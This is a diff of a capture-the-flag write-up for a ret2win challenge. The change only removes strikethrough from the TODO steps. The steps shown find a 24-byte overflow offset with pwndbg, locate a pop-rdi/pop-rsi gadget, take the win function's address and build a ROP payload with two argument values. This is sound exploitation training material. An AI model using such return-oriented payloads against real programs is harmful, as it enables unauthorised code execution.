@@ -52,7 +52,7 @@ Yep, its a ret2win with arguments. Now we can hand everything over to gdb.
 
 **TODO**:
 
-*1. ~~Find offset~~*
+*1. Find offset*
 ```
 pwndbg> cyclic -l daaaaaaa
 Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
@@ -61,18 +61,18 @@ Found at offset 24
                             So a padding of length: 24.
 
 
-*2. ~~Find suitable gadget~~*    
+*2. Find suitable gadget*    
 ```
 $ ROPgadget --binary binary_heist | grep "pop rdi"
 0x0000000000401207 : pop rdi ; pop rsi ; ret
 ```
 
-*3. ~~Get address of win function~~*
+*3. Get address of win function*
 
 ```0x0000000000401243  infiltrate```
 
 
-*4. ~~Craft payload~~*
+*4. Craft payload*
 
 ```payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243)```
 
